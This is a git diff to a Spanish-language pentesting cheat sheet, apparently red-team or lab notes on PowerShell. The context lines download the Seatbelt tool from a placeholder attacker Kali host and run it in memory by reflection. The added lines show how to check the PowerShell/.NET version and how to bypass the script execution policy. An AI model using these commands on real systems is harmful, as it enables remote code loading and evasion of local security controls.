@@ -83,3 +83,25 @@ $bytes = (New-Object System.Net.WebClient).DownloadData('http://<tu-IP-Kali>/Sea
 [System.Reflection.Assembly]::Load($bytes)
 [Seatbelt.Program]::Main("all")
 ```
+
+## Consultar versión de Powershell
+
+Rápido
+```powershell
+$PSVersionTable.CLRVersion
+```
+
+Consulta exacta
+```powershell
+Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full" -Name Release -ErrorAction SilentlyContinue
+
+```
+
+## Execution Policy
+
+Bypass Execution Policy
+
+```
+Set-ExecutionPolicy unrestricted|Bypass
+Set-ExecutionPolicy Bypass -Scope Process
+```
